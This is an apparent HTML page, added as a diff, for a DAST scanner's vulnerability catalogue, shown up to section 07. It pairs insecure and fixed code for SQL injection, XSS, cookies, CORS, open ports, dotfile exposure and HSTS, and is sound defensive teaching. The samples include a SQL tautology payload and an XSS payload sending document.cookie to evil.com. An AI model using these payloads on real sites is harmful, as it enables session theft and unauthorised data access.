@@ -1,0 +1,635 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Sentinel DAST - Vulnerability Catalog</title>
+  <link rel="stylesheet" href="css/styles.css" />
+  <style>
+    /* Add specific catalog styles */
+    .catalog-container {
+      display: flex;
+      max-width: 1400px;
+      margin: 0 auto;
+      padding: 2rem;
+      gap: 2rem;
+      min-height: calc(100vh - 70px);
+    }
+    
+    /* Left Sidebar */
+    .catalog-sidebar {
+      width: 300px;
+      flex-shrink: 0;
+      position: sticky;
+      top: 90px;
+      height: fit-content;
+      background: var(--bg-secondary);
+      border: 1px solid var(--bg-accent);
+      border-radius: 12px;
+      padding: 1.5rem 0;
+    }
+    .catalog-sidebar h3 {
+      padding: 0 1.5rem;
+      margin-bottom: 1rem;
+      color: var(--text-muted);
+      font-size: 0.85rem;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+    }
+    .sidebar-menu {
+      list-style: none;
+    }
+    .sidebar-menu li {
+      margin: 0;
+    }
+    .sidebar-menu a {
+      display: block;
+      padding: 0.75rem 1.5rem;
+      color: var(--text-primary);
+      text-decoration: none;
+      font-size: 0.95rem;
+      border-left: 3px solid transparent;
+      transition: all 0.2s;
+    }
+    .sidebar-menu a:hover {
+      background: rgba(255,255,255,0.05);
+    }
+    .sidebar-menu a.active {
+      background: rgba(59, 130, 246, 0.1);
+      border-left-color: var(--brand-blue);
+      color: var(--brand-blue);
+      font-weight: 600;
+    }
+
+    /* Right Content Window */
+    .catalog-content {
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      gap: 1.5rem;
+    }
+    
+    .catalog-header {
+      margin-bottom: 1rem;
+    }
+    .catalog-header h1 {
+      font-size: 2.5rem;
+      margin-bottom: 0.5rem;
+    }
+    .catalog-header p {
+      color: var(--text-muted);
+      font-size: 1.1rem;
+    }
+    
+    .content-card {
+      background: var(--bg-secondary);
+      border: 1px solid var(--bg-accent);
+      border-radius: 12px;
+      padding: 2rem;
+    }
+    .content-card h2 {
+      font-size: 1.25rem;
+      margin-bottom: 1rem;
+      color: var(--text-primary);
+      display: flex;
+      align-items: center;
+      gap: 0.5rem;
+    }
+    
+    .code-sandbox {
+      background: #0f172a;
+      border-radius: 8px;
+      overflow: hidden;
+      margin-top: 0.5rem;
+      border: 1px solid var(--bg-accent);
+    }
+    .code-sandbox-header {
+      background: rgba(255,255,255,0.05);
+      padding: 0.75rem 1.5rem;
+      font-size: 0.85rem;
+      font-weight: 600;
+      display: flex;
+      align-items: center;
+      gap: 0.5rem;
+      border-bottom: 1px solid var(--bg-accent);
+    }
+    .code-sandbox-header.insecure {
+      color: var(--brand-rose);
+      border-top: 2px solid var(--brand-rose);
+    }
+    .code-sandbox-header.remediated {
+      color: var(--brand-emerald);
+      border-top: 2px solid var(--brand-emerald);
+    }
+    .code-sandbox pre {
+      padding: 1.5rem;
+      margin: 0;
+      color: #e2e8f0;
+      font-family: monospace;
+      font-size: 0.9rem;
+      overflow-x: auto;
+    }
+
+    /* Upsell Banner */
+    .upsell-banner {
+      margin-top: 3rem;
+      background: rgba(59, 130, 246, 0.05);
+      border: 1px solid var(--brand-blue);
+      border-radius: 12px;
+      padding: 2rem;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 2rem;
+      box-shadow: 0 0 20px rgba(59, 130, 246, 0.1);
+    }
+    .upsell-text {
+      flex: 1;
+      font-size: 1rem;
+      line-height: 1.6;
+      color: var(--text-primary);
+    }
+    .upsell-actions {
+      display: flex;
+      gap: 1rem;
+      flex-shrink: 0;
+    }
+    
+    /* Icons */
+    svg.icon {
+      width: 18px; height: 18px;
+    }
+
+    /* Ad Frames */
+    .ad-sidebar {
+      margin-top: 2rem;
+      width: 160px;
+      height: 600px;
+      background: rgba(15, 23, 42, 0.5);
+      border: 1px dashed #475569;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      text-align: center;
+      padding: 1rem;
+      margin-left: auto;
+      margin-right: auto;
+      border-radius: 8px;
+      box-sizing: border-box;
+    }
+    .ad-inline {
+      width: 100%;
+      max-width: 728px;
+      height: 90px;
+      margin: 1.5rem auto;
+      background: rgba(15, 23, 42, 0.5);
+      border: 1px dashed #475569;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      text-align: center;
+      padding: 0.5rem;
+      border-radius: 8px;
+      box-sizing: border-box;
+    }
+    .ad-placeholder {
+      color: #94a3b8;
+      font-weight: bold;
+      font-size: 0.85rem;
+      margin-bottom: 0.5rem;
+    }
+    .ad-disclaimer {
+      font-size: 0.65rem;
+      color: var(--brand-amber);
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+      font-weight: bold;
+    }
+
+    /* Responsive */
+    @media (max-width: 1024px) {
+      .catalog-container { flex-direction: column; }
+      .catalog-sidebar { width: 100%; position: static; }
+      .upsell-banner { flex-direction: column; align-items: stretch; text-align: center; }
+      .upsell-actions { flex-direction: column; }
+    }
+  </style>
+</head>
+<body>
+  <nav class="navbar">
+    <a href="index.html" class="navbar-brand">
+      <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg>
+      Sentinel DAST
+    </a>
+    <div class="navbar-links">
+      <a href="index.html">Home</a>
+      <a href="catalog.html" class="active">Vulnerability Catalog</a>
+      <a href="pricing.html">Pricing Tiers</a>
+      <a href="about.html">About Us</a>
+    </div>
+    <div class="navbar-links">
+      <a href="auth.html">Sign In</a>
+      <a href="auth.html" class="btn btn-primary" style="padding: 0.4rem 1rem;">Get Started</a>
+    </div>
+  </nav>
+
+  <div class="catalog-container">
+    <!-- Left Column: Sidebar Matrix -->
+    <aside class="catalog-sidebar">
+      <h3>Reference Library</h3>
+      <ul class="sidebar-menu">
+        <li><a href="#vuln-01">01. SQL Injection (SQLi)</a></li>
+        <li><a href="#vuln-02">02. Cross-Site Scripting (XSS)</a></li>
+        <li><a href="#vuln-03">03. Session Hijacking</a></li>
+        <li><a href="#vuln-04">04. Malware & Cross-Origin</a></li>
+        <li><a href="#vuln-05">05. Perimeter Service Maps</a></li>
+        <li><a href="#vuln-06">06. Information Disclosure</a></li>
+        <li><a href="#vuln-07">07. Protocol Redirections</a></li>
+        <li><a href="#vuln-08">08. Compliance Headers</a></li>
+      </ul>
+      
+      <!-- Left-Column Sidebar Ad (160x600) -->
+      <div class="ad-sidebar">
+        <div class="ad-placeholder">Sponsorship Ad Content Area<br/>(160x600)</div>
+        <div class="ad-disclaimer">PRO Tier accounts automatically remove all platform sponsorship content containers.</div>
+      </div>
+    </aside>
+
+    <!-- Right Column: Main Content -->
+    <main class="catalog-content">
+      
+      <!-- VULNERABILITY 01 -->
+      <section id="vuln-01" style="scroll-margin-top: 100px; padding-bottom: 2rem; border-bottom: 1px solid var(--bg-accent);">
+        <div class="catalog-header">
+          <h1>SQL Injection (SQLi)</h1>
+          <p>Reference Guide 01 • Database Security Architecture</p>
+        </div>
+
+      <!-- Sub-Card A -->
+      <div class="content-card">
+        <h2>
+          <svg class="icon" viewBox="0 0 24 24" fill="none" stroke="var(--brand-blue)" stroke-width="2"><circle cx="12" cy="12" r="10"></circle><line x1="12" y1="16" x2="12" y2="12"></line><line x1="12" y1="8" x2="12.01" y2="8"></line></svg>
+          Technical Synopsis & Mechanism
+        </h2>
+        <p style="color: var(--text-muted); line-height: 1.6;">
+          SQL Injection (SQLi) manipulates application input boundaries to interfere with backend database query execution. When user-supplied data is dynamically concatenated into raw SQL statements without strict sanitization, malicious operators can append arbitrary commands, bypassing authentication boundaries and actively altering logical query constraints at the data storage layer.
+        </p>
+      </div>
+
+      <!-- Sub-Card B -->
+      <div class="content-card">
+        <h2>
+          <svg class="icon" viewBox="0 0 24 24" fill="none" stroke="var(--brand-amber)" stroke-width="2"><path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"></path><line x1="12" y1="9" x2="12" y2="13"></line><line x1="12" y1="17" x2="12.01" y2="17"></line></svg>
+          Real-World Risk Vector
+        </h2>
+        <p style="color: var(--text-muted); line-height: 1.6;">
+          Leaving this vector open exposes absolute business infrastructure to catastrophic consequences. Attackers can exfiltrate entire encrypted payload tables, dump sensitive user authentication credentials, vertically escalate administrative privileges, or drop production schema matrices entirely, resulting in fatal data exposure and permanent infrastructure compromise.
+        </p>
+      </div>
+
+      <!-- Right-Column Inline Ad (728x90) -->
+      <div class="ad-inline">
+        <div class="ad-placeholder">Monetization Frame (728x90)</div>
+        <div class="ad-disclaimer">PRO Tier accounts automatically remove all platform sponsorship content containers.</div>
+      </div>
+
+      <!-- Sub-Cards C & D -->
+      <div class="content-card">
+        <h2>
+          <svg class="icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="16 18 22 12 16 6"></polyline><polyline points="8 6 2 12 8 18"></polyline></svg>
+          Code Sandbox Environments
+        </h2>
+        
+        <!-- Sub-Card C -->
+        <div class="code-sandbox" style="margin-bottom: 2rem;">
+          <div class="code-sandbox-header insecure">
+            <svg class="icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"></circle><line x1="15" y1="9" x2="9" y2="15"></line><line x1="9" y1="9" x2="15" y2="15"></line></svg>
+            INSECURE CODE SAMPLE (Python Concatenation)
+          </div>
+          <pre><code>def get_user_data(user_id):
+    # DANGEROUS: Direct string concatenation of untrusted input
+    query = "SELECT * FROM users WHERE id = '" + user_id + "';"
+    cursor.execute(query)
+    return cursor.fetchall()
+    
+# Exploit Payload: admin' OR '1'='1
+# Resulting Query: SELECT * FROM users WHERE id = 'admin' OR '1'='1';</code></pre>
+        </div>
+
+        <!-- Sub-Card D -->
+        <div class="code-sandbox">
+          <div class="code-sandbox-header remediated">
+            <svg class="icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path><polyline points="22 4 12 14.01 9 11.01"></polyline></svg>
+            REMEDIATED PRODUCTION CODE (Python Parameterized Query)
+          </div>
+          <pre><code>def get_user_data(user_id):
+    # SECURE: Structural type isolation via parameterized placeholders
+    query = "SELECT * FROM users WHERE id = %s;"
+    cursor.execute(query, (user_id,))
+    return cursor.fetchall()
+
+# Exploit Payload: admin' OR '1'='1
+# Execution Engine treats the payload strictly as a literal string value.</code></pre>
+        </div>
+      </div>
+
+      <!-- Sub-Card E -->
+      <div class="content-card">
+        <h2>
+          <svg class="icon" viewBox="0 0 24 24" fill="none" stroke="var(--brand-emerald)" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg>
+          Perimeter Identification Vector
+        </h2>
+        <p style="color: var(--text-muted); line-height: 1.6;">
+          Automated DAST agents identify this threat behavior by injecting logical tautologies, syntax-breaking single quotes, and delayed-time sleep commands into dynamic HTTP parameters. By analyzing server response anomalies, HTTP 500 error cascades, and forced timing delays, the scanner mathematically verifies active injection pathways from the external perimeter.
+        </p>
+      </div>
+      </section>
+
+      <!-- VULNERABILITY 02 -->
+      <section id="vuln-02" style="scroll-margin-top: 100px; padding-top: 2rem; padding-bottom: 2rem; border-bottom: 1px solid var(--bg-accent);">
+        <div class="catalog-header">
+          <h1>Cross-Site Scripting (XSS)</h1>
+          <p>Reference Guide 02 • Client-Side Execution Layer</p>
+        </div>
+        <div class="content-card">
+          <h2><svg class="icon" viewBox="0 0 24 24" fill="none" stroke="var(--brand-blue)" stroke-width="2"><circle cx="12" cy="12" r="10"></circle><line x1="12" y1="16" x2="12" y2="12"></line><line x1="12" y1="8" x2="12.01" y2="8"></line></svg> Technical Synopsis & Mechanism</h2>
+          <p style="color: var(--text-muted); line-height: 1.6;">Cross-Site Scripting allows attackers to inject malicious client-side JavaScript into web pages viewed by other users. This bypasses the Same-Origin Policy and executes directly within the victim's browser context.</p>
+        </div>
+        <div class="content-card">
+          <h2><svg class="icon" viewBox="0 0 24 24" fill="none" stroke="var(--brand-amber)" stroke-width="2"><path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"></path><line x1="12" y1="9" x2="12" y2="13"></line><line x1="12" y1="17" x2="12.01" y2="17"></line></svg> Real-World Risk Vector</h2>
+          <p style="color: var(--text-muted); line-height: 1.6;">Exposes active user sessions to immediate takeover, allows credential theft via DOM reading, and can permanently ruin site trust by rewriting page content for phishing attacks.</p>
+        </div>
+        <div class="content-card">
+          <h2><svg class="icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="16 18 22 12 16 6"></polyline><polyline points="8 6 2 12 8 18"></polyline></svg> Code Sandbox Environments</h2>
+          <div class="code-sandbox" style="margin-bottom: 2rem;">
+            <div class="code-sandbox-header insecure"><svg class="icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"></circle><line x1="15" y1="9" x2="9" y2="15"></line><line x1="9" y1="9" x2="15" y2="15"></line></svg> INSECURE CODE SAMPLE (PHP Reflection)</div>
+            <pre><code>// DANGEROUS: Rendering raw URL parameters directly to the DOM
+&lt;h1&gt;Welcome, &lt;?php echo $_GET['name']; ?&gt;&lt;/h1&gt;
+
+// Exploit Payload: ?name=&lt;script&gt;fetch('http://evil.com?c='+document.cookie)&lt;/script&gt;</code></pre>
+          </div>
+          <div class="code-sandbox">
+            <div class="code-sandbox-header remediated"><svg class="icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path><polyline points="22 4 12 14.01 9 11.01"></polyline></svg> REMEDIATED PRODUCTION CODE (PHP Escaping)</div>
+            <pre><code>// SECURE: Encoding HTML entities to neutralize script tags
+&lt;h1&gt;Welcome, &lt;?php echo htmlspecialchars($_GET['name'], ENT_QUOTES, 'UTF-8'); ?&gt;&lt;/h1&gt;
+
+// Exploit Neutralized: Rendered strictly as literal text onscreen.</code></pre>
+          </div>
+        </div>
+        <div class="content-card">
+          <h2><svg class="icon" viewBox="0 0 24 24" fill="none" stroke="var(--brand-emerald)" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg> Perimeter Identification Vector</h2>
+          <p style="color: var(--text-muted); line-height: 1.6;">DAST agents inject polymorphic alert payloads `&lt;script&gt;alert(1)&lt;/script&gt;` into query parameters and analyze if they reflect unescaped in the raw HTML response.</p>
+        </div>
+      </section>
+
+      <!-- VULNERABILITY 03 -->
+      <section id="vuln-03" style="scroll-margin-top: 100px; padding-top: 2rem; padding-bottom: 2rem; border-bottom: 1px solid var(--bg-accent);">
+        <div class="catalog-header">
+          <h1>Session Hijacking Vectors</h1>
+          <p>Reference Guide 03 • Authentication State Control</p>
+        </div>
+        <div class="content-card">
+          <h2><svg class="icon" viewBox="0 0 24 24" fill="none" stroke="var(--brand-blue)" stroke-width="2"><circle cx="12" cy="12" r="10"></circle><line x1="12" y1="16" x2="12" y2="12"></line><line x1="12" y1="8" x2="12.01" y2="8"></line></svg> Technical Synopsis & Mechanism</h2>
+          <p style="color: var(--text-muted); line-height: 1.6;">Predictable or improperly scoped session tokens allow adversaries to impersonate authenticated users. Missing Secure or HttpOnly flags on cookies permit malicious client scripts or network snoopers to intercept session keys.</p>
+        </div>
+        <div class="content-card">
+          <h2><svg class="icon" viewBox="0 0 24 24" fill="none" stroke="var(--brand-amber)" stroke-width="2"><path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"></path><line x1="12" y1="9" x2="12" y2="13"></line><line x1="12" y1="17" x2="12.01" y2="17"></line></svg> Real-World Risk Vector</h2>
+          <p style="color: var(--text-muted); line-height: 1.6;">Complete bypass of authentication layers. Attackers can access billing details, reset passwords, or perform actions as the victim without ever knowing their credentials.</p>
+        </div>
+        <div class="content-card">
+          <h2><svg class="icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="16 18 22 12 16 6"></polyline><polyline points="8 6 2 12 8 18"></polyline></svg> Code Sandbox Environments</h2>
+          <div class="code-sandbox" style="margin-bottom: 2rem;">
+            <div class="code-sandbox-header insecure"><svg class="icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"></circle><line x1="15" y1="9" x2="9" y2="15"></line><line x1="9" y1="9" x2="15" y2="15"></line></svg> INSECURE CODE SAMPLE (HTTP Header)</div>
+            <pre><code>HTTP/1.1 200 OK
+Set-Cookie: session_id=abc123xyz; Path=/
+
+# DANGEROUS: Token is accessible via JS (document.cookie) and sent over plaintext HTTP.</code></pre>
+          </div>
+          <div class="code-sandbox">
+            <div class="code-sandbox-header remediated"><svg class="icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path><polyline points="22 4 12 14.01 9 11.01"></polyline></svg> REMEDIATED PRODUCTION CODE (HTTP Header)</div>
+            <pre><code>HTTP/1.1 200 OK
+Set-Cookie: session_id=abc123xyz; Path=/; Secure; HttpOnly; SameSite=Strict
+
+# SECURE: Token blocked from JS, requires HTTPS, and ignores cross-origin requests.</code></pre>
+          </div>
+        </div>
+        <div class="content-card">
+          <h2><svg class="icon" viewBox="0 0 24 24" fill="none" stroke="var(--brand-emerald)" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg> Perimeter Identification Vector</h2>
+          <p style="color: var(--text-muted); line-height: 1.6;">Scanner flags missing Secure and HttpOnly attributes on cookies returned during the initial login authentication handshake.</p>
+        </div>
+      </section>
+
+      <!-- VULNERABILITY 04 -->
+      <section id="vuln-04" style="scroll-margin-top: 100px; padding-top: 2rem; padding-bottom: 2rem; border-bottom: 1px solid var(--bg-accent);">
+        <div class="catalog-header">
+          <h1>Malware & Cross-Origin Risks</h1>
+          <p>Reference Guide 04 • Third-Party Supply Chain Security</p>
+        </div>
+        <div class="content-card">
+          <h2><svg class="icon" viewBox="0 0 24 24" fill="none" stroke="var(--brand-blue)" stroke-width="2"><circle cx="12" cy="12" r="10"></circle><line x1="12" y1="16" x2="12" y2="12"></line><line x1="12" y1="8" x2="12.01" y2="8"></line></svg> Technical Synopsis & Mechanism</h2>
+          <p style="color: var(--text-muted); line-height: 1.6;">Misconfigured CORS allows arbitrary domains to read authenticated API data, while unverified CDN scripts can inject keyloggers directly into your application payload.</p>
+        </div>
+        <div class="content-card">
+          <h2><svg class="icon" viewBox="0 0 24 24" fill="none" stroke="var(--brand-amber)" stroke-width="2"><path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"></path><line x1="12" y1="9" x2="12" y2="13"></line><line x1="12" y1="17" x2="12.01" y2="17"></line></svg> Real-World Risk Vector</h2>
+          <p style="color: var(--text-muted); line-height: 1.6;">Silent mass-exfiltration of private data through third-party supply chain compromise, or API scraping from malicious external websites.</p>
+        </div>
+        <div class="content-card">
+          <h2><svg class="icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="16 18 22 12 16 6"></polyline><polyline points="8 6 2 12 8 18"></polyline></svg> Code Sandbox Environments</h2>
+          <div class="code-sandbox" style="margin-bottom: 2rem;">
+            <div class="code-sandbox-header insecure"><svg class="icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"></circle><line x1="15" y1="9" x2="9" y2="15"></line><line x1="9" y1="9" x2="15" y2="15"></line></svg> INSECURE CODE SAMPLE (CORS Header)</div>
+            <pre><code>Access-Control-Allow-Origin: *
+Access-Control-Allow-Credentials: true
+
+# DANGEROUS: Exposes authenticated API endpoints to any domain globally.</code></pre>
+          </div>
+          <div class="code-sandbox">
+            <div class="code-sandbox-header remediated"><svg class="icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path><polyline points="22 4 12 14.01 9 11.01"></polyline></svg> REMEDIATED PRODUCTION CODE (CORS Header)</div>
+            <pre><code>Access-Control-Allow-Origin: https://trusted.example.com
+Access-Control-Allow-Credentials: true
+
+# SECURE: Strictly whitelists allowed origins.</code></pre>
+          </div>
+        </div>
+        <div class="content-card">
+          <h2><svg class="icon" viewBox="0 0 24 24" fill="none" stroke="var(--brand-emerald)" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg> Perimeter Identification Vector</h2>
+          <p style="color: var(--text-muted); line-height: 1.6;">Scanner evaluates the Access-Control-Allow-Origin response header and cross-references all script tags against malware hash blacklists.</p>
+        </div>
+      </section>
+
+      <!-- VULNERABILITY 05 -->
+      <section id="vuln-05" style="scroll-margin-top: 100px; padding-top: 2rem; padding-bottom: 2rem; border-bottom: 1px solid var(--bg-accent);">
+        <div class="catalog-header">
+          <h1>Perimeter Service Maps</h1>
+          <p>Reference Guide 05 • Network Infrastructure Firewalls</p>
+        </div>
+        <div class="content-card">
+          <h2><svg class="icon" viewBox="0 0 24 24" fill="none" stroke="var(--brand-blue)" stroke-width="2"><circle cx="12" cy="12" r="10"></circle><line x1="12" y1="16" x2="12" y2="12"></line><line x1="12" y1="8" x2="12.01" y2="8"></line></svg> Technical Synopsis & Mechanism</h2>
+          <p style="color: var(--text-muted); line-height: 1.6;">Open administrative ports (SSH, RDP, MySQL) exposed directly to the public internet bypass load balancers and invite brute-force operations.</p>
+        </div>
+        <div class="content-card">
+          <h2><svg class="icon" viewBox="0 0 24 24" fill="none" stroke="var(--brand-amber)" stroke-width="2"><path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"></path><line x1="12" y1="9" x2="12" y2="13"></line><line x1="12" y1="17" x2="12.01" y2="17"></line></svg> Real-World Risk Vector</h2>
+          <p style="color: var(--text-muted); line-height: 1.6;">Immediate zero-day susceptibility and remote code execution if a vulnerable legacy service runs on the exposed port.</p>
+        </div>
+        <div class="content-card">
+          <h2><svg class="icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="16 18 22 12 16 6"></polyline><polyline points="8 6 2 12 8 18"></polyline></svg> Code Sandbox Environments</h2>
+          <div class="code-sandbox" style="margin-bottom: 2rem;">
+            <div class="code-sandbox-header insecure"><svg class="icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"></circle><line x1="15" y1="9" x2="9" y2="15"></line><line x1="9" y1="9" x2="15" y2="15"></line></svg> INSECURE CODE SAMPLE (AWS Security Group)</div>
+            <pre><code>Type: MySQL/Aurora (Port 3306)
+Source: 0.0.0.0/0 
+
+# DANGEROUS: Opens the database to the entire global internet.</code></pre>
+          </div>
+          <div class="code-sandbox">
+            <div class="code-sandbox-header remediated"><svg class="icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path><polyline points="22 4 12 14.01 9 11.01"></polyline></svg> REMEDIATED PRODUCTION CODE (AWS Security Group)</div>
+            <pre><code>Type: MySQL/Aurora (Port 3306)
+Source: sg-0a1b2c3d4e (Web Application Tier)
+
+# SECURE: Restricts access strictly to internal VPC instances.</code></pre>
+          </div>
+        </div>
+        <div class="content-card">
+          <h2><svg class="icon" viewBox="0 0 24 24" fill="none" stroke="var(--brand-emerald)" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg> Perimeter Identification Vector</h2>
+          <p style="color: var(--text-muted); line-height: 1.6;">DAST performs deep SYN port sweeping across the top 1000 administrative ports and identifies running service banners on unexpected interfaces.</p>
+        </div>
+      </section>
+
+      <!-- VULNERABILITY 06 -->
+      <section id="vuln-06" style="scroll-margin-top: 100px; padding-top: 2rem; padding-bottom: 2rem; border-bottom: 1px solid var(--bg-accent);">
+        <div class="catalog-header">
+          <h1>Information Disclosure Assets</h1>
+          <p>Reference Guide 06 • Metadata & Directory Security</p>
+        </div>
+        <div class="content-card">
+          <h2><svg class="icon" viewBox="0 0 24 24" fill="none" stroke="var(--brand-blue)" stroke-width="2"><circle cx="12" cy="12" r="10"></circle><line x1="12" y1="16" x2="12" y2="12"></line><line x1="12" y1="8" x2="12.01" y2="8"></line></svg> Technical Synopsis & Mechanism</h2>
+          <p style="color: var(--text-muted); line-height: 1.6;">Leaving development metadata, .git repositories, or /robots.txt exposed reveals the internal architecture of the target.</p>
+        </div>
+        <div class="content-card">
+          <h2><svg class="icon" viewBox="0 0 24 24" fill="none" stroke="var(--brand-amber)" stroke-width="2"><path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"></path><line x1="12" y1="9" x2="12" y2="13"></line><line x1="12" y1="17" x2="12.01" y2="17"></line></svg> Real-World Risk Vector</h2>
+          <p style="color: var(--text-muted); line-height: 1.6;">Attackers use this blueprint to find hidden administrative panels, raw API keys, or unpatched legacy endpoints before launching tailored attacks.</p>
+        </div>
+        <div class="content-card">
+          <h2><svg class="icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="16 18 22 12 16 6"></polyline><polyline points="8 6 2 12 8 18"></polyline></svg> Code Sandbox Environments</h2>
+          <div class="code-sandbox" style="margin-bottom: 2rem;">
+            <div class="code-sandbox-header insecure"><svg class="icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"></circle><line x1="15" y1="9" x2="9" y2="15"></line><line x1="9" y1="9" x2="15" y2="15"></line></svg> INSECURE CODE SAMPLE (Nginx Config)</div>
+            <pre><code>location / {
+    root /var/www/html;
+}
+# DANGEROUS: Serves /.git/, /.env, and other hidden metadata automatically.</code></pre>
+          </div>
+          <div class="code-sandbox">
+            <div class="code-sandbox-header remediated"><svg class="icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path><polyline points="22 4 12 14.01 9 11.01"></polyline></svg> REMEDIATED PRODUCTION CODE (Nginx Config)</div>
+            <pre><code>location ~ /\.(?!well-known).* {
+    deny all;
+}
+# SECURE: Actively drops HTTP requests for hidden dotfiles with a 403.</code></pre>
+          </div>
+        </div>
+        <div class="content-card">
+          <h2><svg class="icon" viewBox="0 0 24 24" fill="none" stroke="var(--brand-emerald)" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg> Perimeter Identification Vector</h2>
+          <p style="color: var(--text-muted); line-height: 1.6;">Scanner attempts unauthenticated directory brute-forcing against standard hidden metadata paths.</p>
+        </div>
+      </section>
+
+      <!-- VULNERABILITY 07 -->
+      <section id="vuln-07" style="scroll-margin-top: 100px; padding-top: 2rem; padding-bottom: 2rem; border-bottom: 1px solid var(--bg-accent);">
+        <div class="catalog-header">
+          <h1>Insecure Protocol Redirections</h1>
+          <p>Reference Guide 07 • Transport Layer Cryptography</p>
+        </div>
+        <div class="content-card">
+          <h2><svg class="icon" viewBox="0 0 24 24" fill="none" stroke="var(--brand-blue)" stroke-width="2"><circle cx="12" cy="12" r="10"></circle><line x1="12" y1="16" x2="12" y2="12"></line><line x1="12" y1="8" x2="12.01" y2="8"></line></svg> Technical Synopsis & Mechanism</h2>
+          <p style="color: var(--text-muted); line-height: 1.6;">Failing to enforce HTTP Strict Transport Security (HSTS) allows traffic interception over unencrypted HTTP protocol tunnels.</p>
+        </div>
+        <div class="content-card">
+          <h2><svg class="icon" viewBox="0 0 24 24" fill="none" stroke="var(--brand-amber)" stroke-width="2"><path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"></path><line x1="12" y1="9" x2="12" y2="13"></line><line x1="12" y1="17" x2="12.01" y2="17"></line></svg> Real-World Risk Vector</h2>
+          <p style="color: var(--text-muted); line-height: 1.6;">Attackers on the local network (e.g., public Wi-Fi) can perform Man-In-The-Middle (MITM) attacks and capture cleartext credentials in real time.</p>
+        </div>
+        <div class="content-card">
+          <h2><svg class="icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="16 18 22 12 16 6"></polyline><polyline points="8 6 2 12 8 18"></polyline></svg> Code Sandbox Environments</h2>
+          <div class="code-sandbox" style="margin-bottom: 2rem;">
+            <div class="code-sandbox-header insecure"><svg class="icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"></circle><line x1="15" y1="9" x2="9" y2="15"></line><line x1="9" y1="9" x2="15" y2="15"></line></svg> INSECURE CODE SAMPLE (HTTP Header)</div>
+            <pre><code>HTTP/1.1 200 OK
+Content-Type: text/html
+
+# DANGEROUS: Server accepts HTTP traffic on Port 80 without upgrading.</code></pre>
+          </div>
+          <div class="code-sandbox">
